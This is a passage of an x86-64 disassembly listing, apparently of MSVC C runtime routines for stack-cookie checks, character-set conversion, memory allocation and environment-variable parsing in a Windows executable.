   1400078bd:	e8 5e 2b 00 00       	call   0x14000a420
   1400078c2:	eb 0e                	jmp    0x1400078d2
   1400078c4:	80 7d 98 00          	cmpb   $0x0,-0x68(%rbp)
   1400078c8:	74 08                	je     0x1400078d2
   1400078ca:	49 8b cf             	mov    %r15,%rcx
   1400078cd:	e8 02 df ff ff       	call   0x1400057d4
   1400078d2:	48 8b cb             	mov    %rbx,%rcx
   1400078d5:	ff 15 a5 de 00 00    	call   *0xdea5(%rip)        # 0x140015780
   1400078db:	80 7d c8 00          	cmpb   $0x0,-0x38(%rbp)
   1400078df:	74 09                	je     0x1400078ea
   1400078e1:	48 8b 4d b0          	mov    -0x50(%rbp),%rcx
   1400078e5:	e8 ea de ff ff       	call   0x1400057d4
   1400078ea:	8b c7                	mov    %edi,%eax
   1400078ec:	48 8b 8d 20 02 00 00 	mov    0x220(%rbp),%rcx
   1400078f3:	48 33 cc             	xor    %rsp,%rcx
   1400078f6:	e8 25 9a ff ff       	call   0x140001320
   1400078fb:	48 8b 9c 24 88 03 00 	mov    0x388(%rsp),%rbx
   140007902:	00 
   140007903:	48 81 c4 30 03 00 00 	add    $0x330,%rsp
   14000790a:	41 5f                	pop    %r15
   14000790c:	41 5e                	pop    %r14
   14000790e:	41 5d                	pop    %r13
   140007910:	41 5c                	pop    %r12
   140007912:	5f                   	pop    %rdi
   140007913:	5e                   	pop    %rsi
   140007914:	5d                   	pop    %rbp
   140007915:	c3                   	ret
   140007916:	cc                   	int3
   140007917:	cc                   	int3
   140007918:	48 3b ca             	cmp    %rdx,%rcx
   14000791b:	73 04                	jae    0x140007921
   14000791d:	83 c8 ff             	or     $0xffffffff,%eax
   140007920:	c3                   	ret
   140007921:	33 c0                	xor    %eax,%eax
   140007923:	48 3b ca             	cmp    %rdx,%rcx
   140007926:	0f 97 c0             	seta   %al
   140007929:	c3                   	ret
   14000792a:	cc                   	int3
   14000792b:	cc                   	int3
   14000792c:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140007931:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140007936:	55                   	push   %rbp
   140007937:	48 8d ac 24 70 fe ff 	lea    -0x190(%rsp),%rbp
   14000793e:	ff 
   14000793f:	48 81 ec 90 02 00 00 	sub    $0x290,%rsp
   140007946:	48 8b 05 eb f6 00 00 	mov    0xf6eb(%rip),%rax        # 0x140017038
   14000794d:	48 33 c4             	xor    %rsp,%rax
   140007950:	48 89 85 80 01 00 00 	mov    %rax,0x180(%rbp)
   140007957:	41 8b f8             	mov    %r8d,%edi
   14000795a:	48 8b da             	mov    %rdx,%rbx
   14000795d:	41 b8 05 01 00 00    	mov    $0x105,%r8d
   140007963:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   140007968:	ff 15 a2 de 00 00    	call   *0xdea2(%rip)        # 0x140015810
   14000796e:	85 c0                	test   %eax,%eax
   140007970:	75 14                	jne    0x140007986
   140007972:	ff 15 90 de 00 00    	call   *0xde90(%rip)        # 0x140015808
   140007978:	8b c8                	mov    %eax,%ecx
   14000797a:	e8 bd e9 ff ff       	call   0x14000633c
   14000797f:	33 c0                	xor    %eax,%eax
   140007981:	e9 a0 00 00 00       	jmp    0x140007a26
   140007986:	48 83 64 24 60 00    	andq   $0x0,0x60(%rsp)
   14000798c:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140007991:	48 8b c7             	mov    %rdi,%rax
   140007994:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   140007999:	33 d2                	xor    %edx,%edx
   14000799b:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   1400079a0:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   1400079a5:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   1400079aa:	c6 44 24 68 00       	movb   $0x0,0x68(%rsp)
   1400079af:	e8 a0 d3 ff ff       	call   0x140004d54
   1400079b4:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   1400079b9:	41 b8 e9 fd 00 00    	mov    $0xfde9,%r8d
   1400079bf:	44 39 40 0c          	cmp    %r8d,0xc(%rax)
   1400079c3:	75 15                	jne    0x1400079da
   1400079c5:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   1400079ca:	74 47                	je     0x140007a13
   1400079cc:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   1400079d1:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   1400079d8:	eb 39                	jmp    0x140007a13
   1400079da:	e8 85 c3 ff ff       	call   0x140003d64
   1400079df:	85 c0                	test   %eax,%eax
   1400079e1:	75 1a                	jne    0x1400079fd
   1400079e3:	38 44 24 38          	cmp    %al,0x38(%rsp)
   1400079e7:	74 0c                	je     0x1400079f5
   1400079e9:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   1400079ee:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   1400079f5:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   1400079fb:	eb 16                	jmp    0x140007a13
   1400079fd:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   140007a02:	74 0c                	je     0x140007a10
   140007a04:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140007a09:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   140007a10:	45 33 c0             	xor    %r8d,%r8d
   140007a13:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   140007a18:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140007a1d:	e8 2a 00 00 00       	call   0x140007a4c
   140007a22:	8b 44 24 60          	mov    0x60(%rsp),%eax
   140007a26:	48 8b 8d 80 01 00 00 	mov    0x180(%rbp),%rcx
   140007a2d:	48 33 cc             	xor    %rsp,%rcx
   140007a30:	e8 eb 98 ff ff       	call   0x140001320
   140007a35:	4c 8d 9c 24 90 02 00 	lea    0x290(%rsp),%r11
   140007a3c:	00 
   140007a3d:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   140007a41:	49 8b 7b 20          	mov    0x20(%r11),%rdi
   140007a45:	49 8b e3             	mov    %r11,%rsp
   140007a48:	5d                   	pop    %rbp
   140007a49:	c3                   	ret
   140007a4a:	cc                   	int3
   140007a4b:	cc                   	int3
   140007a4c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007a51:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140007a56:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140007a5b:	57                   	push   %rdi
   140007a5c:	48 83 ec 40          	sub    $0x40,%rsp
   140007a60:	33 db                	xor    %ebx,%ebx
   140007a62:	41 8b e8             	mov    %r8d,%ebp
   140007a65:	48 8b fa             	mov    %rdx,%rdi
   140007a68:	48 8b f1             	mov    %rcx,%rsi
   140007a6b:	48 85 c9             	test   %rcx,%rcx
   140007a6e:	75 19                	jne    0x140007a89
   140007a70:	38 5a 28             	cmp    %bl,0x28(%rdx)
   140007a73:	74 03                	je     0x140007a78
   140007a75:	88 5a 28             	mov    %bl,0x28(%rdx)
   140007a78:	48 89 5a 10          	mov    %rbx,0x10(%rdx)
   140007a7c:	48 89 5a 18          	mov    %rbx,0x18(%rdx)
   140007a80:	48 89 5a 20          	mov    %rbx,0x20(%rdx)
   140007a84:	e9 bd 00 00 00       	jmp    0x140007b46
   140007a89:	66 39 19             	cmp    %bx,(%rcx)
   140007a8c:	75 30                	jne    0x140007abe
   140007a8e:	48 39 5a 18          	cmp    %rbx,0x18(%rdx)
   140007a92:	75 22                	jne    0x140007ab6
   140007a94:	38 5a 28             	cmp    %bl,0x28(%rdx)
   140007a97:	74 03                	je     0x140007a9c
   140007a99:	88 5a 28             	mov    %bl,0x28(%rdx)
   140007a9c:	e8 5b e8 ff ff       	call   0x1400062fc
   140007aa1:	b9 22 00 00 00       	mov    $0x22,%ecx
   140007aa6:	89 08                	mov    %ecx,(%rax)
   140007aa8:	88 5f 28             	mov    %bl,0x28(%rdi)
   140007aab:	48 89 5f 18          	mov    %rbx,0x18(%rdi)
   140007aaf:	8b d9                	mov    %ecx,%ebx
   140007ab1:	e9 90 00 00 00       	jmp    0x140007b46
   140007ab6:	48 8b 42 10          	mov    0x10(%rdx),%rax
   140007aba:	88 18                	mov    %bl,(%rax)
   140007abc:	eb c2                	jmp    0x140007a80
   140007abe:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   140007ac3:	41 83 c9 ff          	or     $0xffffffff,%r9d
   140007ac7:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140007acc:	4c 8b c6             	mov    %rsi,%r8
   140007acf:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   140007ad3:	33 d2                	xor    %edx,%edx
   140007ad5:	8b cd                	mov    %ebp,%ecx
   140007ad7:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140007adc:	e8 a3 01 00 00       	call   0x140007c84
   140007ae1:	48 63 d0             	movslq %eax,%rdx
   140007ae4:	85 c0                	test   %eax,%eax
   140007ae6:	75 16                	jne    0x140007afe
   140007ae8:	ff 15 1a dd 00 00    	call   *0xdd1a(%rip)        # 0x140015808
   140007aee:	8b c8                	mov    %eax,%ecx
   140007af0:	e8 47 e8 ff ff       	call   0x14000633c
   140007af5:	e8 02 e8 ff ff       	call   0x1400062fc
   140007afa:	8b 18                	mov    (%rax),%ebx
   140007afc:	eb 48                	jmp    0x140007b46
   140007afe:	48 8b 4f 18          	mov    0x18(%rdi),%rcx
   140007b02:	48 3b d1             	cmp    %rcx,%rdx
   140007b05:	76 0a                	jbe    0x140007b11
   140007b07:	38 5f 28             	cmp    %bl,0x28(%rdi)
   140007b0a:	74 90                	je     0x140007a9c
   140007b0c:	88 5f 28             	mov    %bl,0x28(%rdi)
   140007b0f:	eb 8b                	jmp    0x140007a9c
   140007b11:	48 8b 47 10          	mov    0x10(%rdi),%rax
   140007b15:	41 83 c9 ff          	or     $0xffffffff,%r9d
   140007b19:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   140007b1e:	4c 8b c6             	mov    %rsi,%r8
   140007b21:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140007b26:	33 d2                	xor    %edx,%edx
   140007b28:	89 4c 24 28          	mov    %ecx,0x28(%rsp)
   140007b2c:	8b cd                	mov    %ebp,%ecx
   140007b2e:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140007b33:	e8 4c 01 00 00       	call   0x140007c84
   140007b38:	48 63 c8             	movslq %eax,%rcx
   140007b3b:	85 c0                	test   %eax,%eax
   140007b3d:	74 a9                	je     0x140007ae8
   140007b3f:	48 ff c9             	dec    %rcx
   140007b42:	48 89 4f 20          	mov    %rcx,0x20(%rdi)
   140007b46:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   140007b4b:	8b c3                	mov    %ebx,%eax
   140007b4d:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140007b52:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   140007b57:	48 83 c4 40          	add    $0x40,%rsp
   140007b5b:	5f                   	pop    %rdi
   140007b5c:	c3                   	ret
   140007b5d:	cc                   	int3
   140007b5e:	cc                   	int3
   140007b5f:	cc                   	int3
   140007b60:	8b d1                	mov    %ecx,%edx
   140007b62:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   140007b68:	33 c9                	xor    %ecx,%ecx
   140007b6a:	45 33 c0             	xor    %r8d,%r8d
   140007b6d:	e9 02 00 00 00       	jmp    0x140007b74
   140007b72:	cc                   	int3
   140007b73:	cc                   	int3
   140007b74:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007b79:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140007b7e:	57                   	push   %rdi
   140007b7f:	48 83 ec 40          	sub    $0x40,%rsp
   140007b83:	8b da                	mov    %edx,%ebx
   140007b85:	41 8b f9             	mov    %r9d,%edi
   140007b88:	48 8b d1             	mov    %rcx,%rdx
   140007b8b:	41 8b f0             	mov    %r8d,%esi
   140007b8e:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140007b93:	e8 bc d1 ff ff       	call   0x140004d54
   140007b98:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   140007b9d:	0f b6 d3             	movzbl %bl,%edx
   140007ba0:	40 84 7c 02 19       	test   %dil,0x19(%rdx,%rax,1)
   140007ba5:	75 1a                	jne    0x140007bc1
   140007ba7:	85 f6                	test   %esi,%esi
   140007ba9:	74 10                	je     0x140007bbb
   140007bab:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   140007bb0:	48 8b 08             	mov    (%rax),%rcx
   140007bb3:	0f b7 04 51          	movzwl (%rcx,%rdx,2),%eax
   140007bb7:	23 c6                	and    %esi,%eax
   140007bb9:	eb 02                	jmp    0x140007bbd
   140007bbb:	33 c0                	xor    %eax,%eax
   140007bbd:	85 c0                	test   %eax,%eax
   140007bbf:	74 05                	je     0x140007bc6
   140007bc1:	b8 01 00 00 00       	mov    $0x1,%eax
   140007bc6:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   140007bcb:	74 0c                	je     0x140007bd9
   140007bcd:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140007bd2:	83 a1 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rcx)
   140007bd9:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140007bde:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   140007be3:	48 83 c4 40          	add    $0x40,%rsp
   140007be7:	5f                   	pop    %rdi
   140007be8:	c3                   	ret
   140007be9:	cc                   	int3
   140007bea:	cc                   	int3
   140007beb:	cc                   	int3
   140007bec:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007bf1:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140007bf6:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140007bfb:	57                   	push   %rdi
   140007bfc:	48 83 ec 20          	sub    $0x20,%rsp
   140007c00:	49 8b e8             	mov    %r8,%rbp
   140007c03:	48 8b da             	mov    %rdx,%rbx
   140007c06:	48 8b f1             	mov    %rcx,%rsi
   140007c09:	48 85 d2             	test   %rdx,%rdx
   140007c0c:	74 1d                	je     0x140007c2b
   140007c0e:	33 d2                	xor    %edx,%edx
   140007c10:	48 8d 42 e0          	lea    -0x20(%rdx),%rax
   140007c14:	48 f7 f3             	div    %rbx
   140007c17:	49 3b c0             	cmp    %r8,%rax
   140007c1a:	73 0f                	jae    0x140007c2b
   140007c1c:	e8 db e6 ff ff       	call   0x1400062fc
   140007c21:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   140007c27:	33 c0                	xor    %eax,%eax
   140007c29:	eb 41                	jmp    0x140007c6c
   140007c2b:	48 85 f6             	test   %rsi,%rsi
   140007c2e:	74 0a                	je     0x140007c3a
   140007c30:	e8 6f 31 00 00       	call   0x14000ada4
   140007c35:	48 8b f8             	mov    %rax,%rdi
   140007c38:	eb 02                	jmp    0x140007c3c
   140007c3a:	33 ff                	xor    %edi,%edi
   140007c3c:	48 0f af dd          	imul   %rbp,%rbx
   140007c40:	48 8b ce             	mov    %rsi,%rcx
   140007c43:	48 8b d3             	mov    %rbx,%rdx
   140007c46:	e8 95 31 00 00       	call   0x14000ade0
   140007c4b:	48 8b f0             	mov    %rax,%rsi
   140007c4e:	48 85 c0             	test   %rax,%rax
   140007c51:	74 16                	je     0x140007c69
   140007c53:	48 3b fb             	cmp    %rbx,%rdi
   140007c56:	73 11                	jae    0x140007c69
   140007c58:	48 2b df             	sub    %rdi,%rbx
   140007c5b:	48 8d 0c 38          	lea    (%rax,%rdi,1),%rcx
   140007c5f:	4c 8b c3             	mov    %rbx,%r8
   140007c62:	33 d2                	xor    %edx,%edx
   140007c64:	e8 c7 a6 ff ff       	call   0x140002330
   140007c69:	48 8b c6             	mov    %rsi,%rax
   140007c6c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007c71:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140007c76:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140007c7b:	48 83 c4 20          	add    $0x20,%rsp
   140007c7f:	5f                   	pop    %rdi
   140007c80:	c3                   	ret
   140007c81:	cc                   	int3
   140007c82:	cc                   	int3
   140007c83:	cc                   	int3
   140007c84:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007c89:	57                   	push   %rdi
   140007c8a:	8d 81 18 02 ff ff    	lea    -0xfde8(%rcx),%eax
   140007c90:	45 8b d9             	mov    %r9d,%r11d
   140007c93:	83 f8 01             	cmp    $0x1,%eax
   140007c96:	49 8b d8             	mov    %r8,%rbx
   140007c99:	41 0f 96 c2          	setbe  %r10b
   140007c9d:	33 ff                	xor    %edi,%edi
   140007c9f:	81 f9 35 c4 00 00    	cmp    $0xc435,%ecx
   140007ca5:	77 1c                	ja     0x140007cc3
   140007ca7:	8d 81 d4 3b ff ff    	lea    -0xc42c(%rcx),%eax
   140007cad:	83 f8 09             	cmp    $0x9,%eax
   140007cb0:	77 0c                	ja     0x140007cbe
   140007cb2:	41 b8 a7 02 00 00    	mov    $0x2a7,%r8d
   140007cb8:	41 0f a3 c0          	bt     %eax,%r8d
   140007cbc:	72 33                	jb     0x140007cf1
   140007cbe:	83 f9 2a             	cmp    $0x2a,%ecx
   140007cc1:	eb 26                	jmp    0x140007ce9
   140007cc3:	81 f9 98 d6 00 00    	cmp    $0xd698,%ecx
   140007cc9:	74 26                	je     0x140007cf1
   140007ccb:	81 f9 a9 de 00 00    	cmp    $0xdea9,%ecx
   140007cd1:	76 18                	jbe    0x140007ceb
   140007cd3:	81 f9 b3 de 00 00    	cmp    $0xdeb3,%ecx
   140007cd9:	76 16                	jbe    0x140007cf1
   140007cdb:	81 f9 e8 fd 00 00    	cmp    $0xfde8,%ecx
   140007ce1:	74 0e                	je     0x140007cf1
   140007ce3:	81 f9 e9 fd 00 00    	cmp    $0xfde9,%ecx
   140007ce9:	74 06                	je     0x140007cf1
   140007ceb:	0f ba f2 07          	btr    $0x7,%edx
   140007cef:	eb 02                	jmp    0x140007cf3
   140007cf1:	8b d7                	mov    %edi,%edx
   140007cf3:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   140007cf8:	45 84 d2             	test   %r10b,%r10b
   140007cfb:	4c 8b 4c 24 40       	mov    0x40(%rsp),%r9
   140007d00:	4c 8b c0             	mov    %rax,%r8
   140007d03:	4c 0f 45 c7          	cmovne %rdi,%r8
   140007d07:	4c 0f 45 cf          	cmovne %rdi,%r9
   140007d0b:	74 07                	je     0x140007d14
   140007d0d:	48 85 c0             	test   %rax,%rax
   140007d10:	74 02                	je     0x140007d14
   140007d12:	89 38                	mov    %edi,(%rax)
   140007d14:	4c 89 44 24 48       	mov    %r8,0x48(%rsp)
   140007d19:	4c 8b c3             	mov    %rbx,%r8
   140007d1c:	4c 89 4c 24 40       	mov    %r9,0x40(%rsp)
   140007d21:	45 8b cb             	mov    %r11d,%r9d
   140007d24:	48 8b 5c 24 10       	mov    0x10(%rsp),%rbx
   140007d29:	5f                   	pop    %rdi
   140007d2a:	48 ff 25 27 dc 00 00 	rex.W jmp *0xdc27(%rip)        # 0x140015958
   140007d31:	cc                   	int3
   140007d32:	cc                   	int3
   140007d33:	cc                   	int3
   140007d34:	48 8b c4             	mov    %rsp,%rax
   140007d37:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140007d3b:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140007d3f:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140007d43:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140007d47:	41 56                	push   %r14
   140007d49:	48 83 ec 40          	sub    $0x40,%rsp
   140007d4d:	ff 15 a5 da 00 00    	call   *0xdaa5(%rip)        # 0x1400157f8
   140007d53:	45 33 f6             	xor    %r14d,%r14d
   140007d56:	48 8b d8             	mov    %rax,%rbx
   140007d59:	48 85 c0             	test   %rax,%rax
   140007d5c:	0f 84 a4 00 00 00    	je     0x140007e06
   140007d62:	48 8b f0             	mov    %rax,%rsi
   140007d65:	66 44 39 30          	cmp    %r14w,(%rax)
   140007d69:	74 1c                	je     0x140007d87
   140007d6b:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140007d6f:	48 ff c0             	inc    %rax
   140007d72:	66 44 39 34 46       	cmp    %r14w,(%rsi,%rax,2)
   140007d77:	75 f6                	jne    0x140007d6f
   140007d79:	48 8d 34 46          	lea    (%rsi,%rax,2),%rsi
   140007d7d:	48 83 c6 02          	add    $0x2,%rsi
   140007d81:	66 44 39 36          	cmp    %r14w,(%rsi)
   140007d85:	75 e4                	jne    0x140007d6b
   140007d87:	4c 89 74 24 38       	mov    %r14,0x38(%rsp)
   140007d8c:	48 2b f3             	sub    %rbx,%rsi
   140007d8f:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
   140007d94:	48 83 c6 02          	add    $0x2,%rsi
   140007d98:	48 d1 fe             	sar    $1,%rsi
   140007d9b:	4c 8b c3             	mov    %rbx,%r8
   140007d9e:	44 8b ce             	mov    %esi,%r9d
   140007da1:	44 89 74 24 28       	mov    %r14d,0x28(%rsp)
   140007da6:	33 d2                	xor    %edx,%edx
   140007da8:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   140007dad:	33 c9                	xor    %ecx,%ecx
   140007daf:	e8 d0 fe ff ff       	call   0x140007c84
   140007db4:	48 63 e8             	movslq %eax,%rbp
   140007db7:	85 c0                	test   %eax,%eax
   140007db9:	74 4b                	je     0x140007e06
   140007dbb:	48 8b cd             	mov    %rbp,%rcx
   140007dbe:	e8 cd e9 ff ff       	call   0x140006790
   140007dc3:	48 8b f8             	mov    %rax,%rdi
   140007dc6:	48 85 c0             	test   %rax,%rax
   140007dc9:	74 2e                	je     0x140007df9
   140007dcb:	4c 89 74 24 38       	mov    %r14,0x38(%rsp)
   140007dd0:	44 8b ce             	mov    %esi,%r9d
   140007dd3:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
   140007dd8:	4c 8b c3             	mov    %rbx,%r8
   140007ddb:	89 6c 24 28          	mov    %ebp,0x28(%rsp)
   140007ddf:	33 d2                	xor    %edx,%edx
   140007de1:	33 c9                	xor    %ecx,%ecx
   140007de3:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140007de8:	e8 97 fe ff ff       	call   0x140007c84
   140007ded:	85 c0                	test   %eax,%eax
   140007def:	74 08                	je     0x140007df9
   140007df1:	48 8b f7             	mov    %rdi,%rsi
   140007df4:	49 8b fe             	mov    %r14,%rdi
   140007df7:	eb 03                	jmp    0x140007dfc
   140007df9:	49 8b f6             	mov    %r14,%rsi
   140007dfc:	48 8b cf             	mov    %rdi,%rcx
   140007dff:	e8 d0 d9 ff ff       	call   0x1400057d4
   140007e04:	eb 03                	jmp    0x140007e09
   140007e06:	49 8b f6             	mov    %r14,%rsi
   140007e09:	48 85 db             	test   %rbx,%rbx
   140007e0c:	74 09                	je     0x140007e17
   140007e0e:	48 8b cb             	mov    %rbx,%rcx
   140007e11:	ff 15 89 d9 00 00    	call   *0xd989(%rip)        # 0x1400157a0
   140007e17:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140007e1c:	48 8b c6             	mov    %rsi,%rax
   140007e1f:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   140007e24:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   140007e29:	48 8b 7c 24 68       	mov    0x68(%rsp),%rdi
   140007e2e:	48 83 c4 40          	add    $0x40,%rsp
   140007e32:	41 5e                	pop    %r14
   140007e34:	c3                   	ret
   140007e35:	cc                   	int3
   140007e36:	cc                   	int3
   140007e37:	cc                   	int3
   140007e38:	e9 03 00 00 00       	jmp    0x140007e40
   140007e3d:	cc                   	int3
   140007e3e:	cc                   	int3
   140007e3f:	cc                   	int3
   140007e40:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140007e45:	89 54 24 10          	mov    %edx,0x10(%rsp)
   140007e49:	55                   	push   %rbp
   140007e4a:	56                   	push   %rsi
   140007e4b:	57                   	push   %rdi
   140007e4c:	41 54                	push   %r12
   140007e4e:	41 55                	push   %r13
   140007e50:	41 56                	push   %r14
   140007e52:	41 57                	push   %r15
   140007e54:	48 83 ec 30          	sub    $0x30,%rsp
   140007e58:	33 f6                	xor    %esi,%esi
   140007e5a:	8b da                	mov    %edx,%ebx
   140007e5c:	4c 8b f9             	mov    %rcx,%r15
   140007e5f:	48 85 c9             	test   %rcx,%rcx
   140007e62:	75 14                	jne    0x140007e78
   140007e64:	e8 93 e4 ff ff       	call   0x1400062fc
   140007e69:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140007e6f:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140007e73:	e9 bb 02 00 00       	jmp    0x140008133
   140007e78:	ba 3d 00 00 00       	mov    $0x3d,%edx
   140007e7d:	49 8b ff             	mov    %r15,%rdi
   140007e80:	e8 d7 2f 00 00       	call   0x14000ae5c
   140007e85:	4c 8b e8             	mov    %rax,%r13
   140007e88:	48 85 c0             	test   %rax,%rax
   140007e8b:	0f 84 81 02 00 00    	je     0x140008112
   140007e91:	49 3b c7             	cmp    %r15,%rax
   140007e94:	0f 84 78 02 00 00    	je     0x140008112
   140007e9a:	4c 8b 35 17 03 01 00 	mov    0x10317(%rip),%r14        # 0x1400181b8
   140007ea1:	4c 3b 35 28 03 01 00 	cmp    0x10328(%rip),%r14        # 0x1400181d0
   140007ea8:	40 8a 68 01          	mov    0x1(%rax),%bpl
   140007eac:	40 88 6c 24 70       	mov    %bpl,0x70(%rsp)
   140007eb1:	75 12                	jne    0x140007ec5
   140007eb3:	49 8b ce             	mov    %r14,%rcx
   140007eb6:	e8 a5 02 00 00       	call   0x140008160
   140007ebb:	4c 8b f0             	mov    %rax,%r14
   140007ebe:	48 89 05 f3 02 01 00 	mov    %rax,0x102f3(%rip)        # 0x1400181b8
   140007ec5:	41 bc 01 00 00 00    	mov    $0x1,%r12d
   140007ecb:	4d 85 f6             	test   %r14,%r14
   140007ece:	0f 85 b5 00 00 00    	jne    0x140007f89
   140007ed4:	85 db                	test   %ebx,%ebx
   140007ed6:	74 3f                	je     0x140007f17
   140007ed8:	48 39 35 e1 02 01 00 	cmp    %rsi,0x102e1(%rip)        # 0x1400181c0
   140007edf:	74 36                	je     0x140007f17
   140007ee1:	e8 0e b4 ff ff       	call   0x1400032f4
   140007ee6:	48 85 c0             	test   %rax,%rax
   140007ee9:	0f 84 23 02 00 00    	je     0x140008112
   140007eef:	4c 8b 35 c2 02 01 00 	mov    0x102c2(%rip),%r14        # 0x1400181b8
   140007ef6:	4c 3b 35 d3 02 01 00 	cmp    0x102d3(%rip),%r14        # 0x1400181d0
   140007efd:	0f 85 81 00 00 00    	jne    0x140007f84
   140007f03:	49 8b ce             	mov    %r14,%rcx
   140007f06:	e8 55 02 00 00       	call   0x140008160
   140007f0b:	4c 8b f0             	mov    %rax,%r14
   140007f0e:	48 89 05 a3 02 01 00 	mov    %rax,0x102a3(%rip)        # 0x1400181b8
   140007f15:	eb 6d                	jmp    0x140007f84
   140007f17:	40 84 ed             	test   %bpl,%bpl
   140007f1a:	0f 84 01 02 00 00    	je     0x140008121
   140007f20:	ba 08 00 00 00       	mov    $0x8,%edx
   140007f25:	49 8b cc             	mov    %r12,%rcx
   140007f28:	e8 eb e7 ff ff       	call   0x140006718
   140007f2d:	33 c9                	xor    %ecx,%ecx
   140007f2f:	48 89 05 82 02 01 00 	mov    %rax,0x10282(%rip)        # 0x1400181b8
   140007f36:	e8 99 d8 ff ff       	call   0x1400057d4
   140007f3b:	4c 8b 35 76 02 01 00 	mov    0x10276(%rip),%r14        # 0x1400181b8
   140007f42:	4d 85 f6             	test   %r14,%r14
   140007f45:	75 09                	jne    0x140007f50
   140007f47:	48 83 cd ff          	or     $0xffffffffffffffff,%rbp
   140007f4b:	e9 d3 01 00 00       	jmp    0x140008123
   140007f50:	48 39 35 69 02 01 00 	cmp    %rsi,0x10269(%rip)        # 0x1400181c0
   140007f57:	75 2b                	jne    0x140007f84
   140007f59:	ba 08 00 00 00       	mov    $0x8,%edx
   140007f5e:	49 8b cc             	mov    %r12,%rcx
   140007f61:	e8 b2 e7 ff ff       	call   0x140006718
   140007f66:	33 c9                	xor    %ecx,%ecx
   140007f68:	48 89 05 51 02 01 00 	mov    %rax,0x10251(%rip)        # 0x1400181c0
   140007f6f:	e8 60 d8 ff ff       	call   0x1400057d4
   140007f74:	48 39 35 45 02 01 00 	cmp    %rsi,0x10245(%rip)        # 0x1400181c0
   140007f7b:	74 ca                	je     0x140007f47
   140007f7d:	4c 8b 35 34 02 01 00 	mov    0x10234(%rip),%r14        # 0x1400181b8
   140007f84:	4d 85 f6             	test   %r14,%r14
   140007f87:	74 be                	je     0x140007f47
   140007f89:	49 8b 06             	mov    (%r14),%rax
   140007f8c:	4d 8b e5             	mov    %r13,%r12
   140007f8f:	4d 2b e7             	sub    %r15,%r12
   140007f92:	49 8b de             	mov    %r14,%rbx
   140007f95:	48 85 c0             	test   %rax,%rax
   140007f98:	74 34                	je     0x140007fce
   140007f9a:	4d 8b c4             	mov    %r12,%r8
   140007f9d:	48 8b d0             	mov    %rax,%rdx
   140007fa0:	49 8b cf             	mov    %r15,%rcx
   140007fa3:	e8 34 2f 00 00       	call   0x14000aedc
   140007fa8:	85 c0                	test   %eax,%eax
   140007faa:	75 10                	jne    0x140007fbc
   140007fac:	48 8b 03             	mov    (%rbx),%rax
   140007faf:	41 80 3c 04 3d       	cmpb   $0x3d,(%r12,%rax,1)
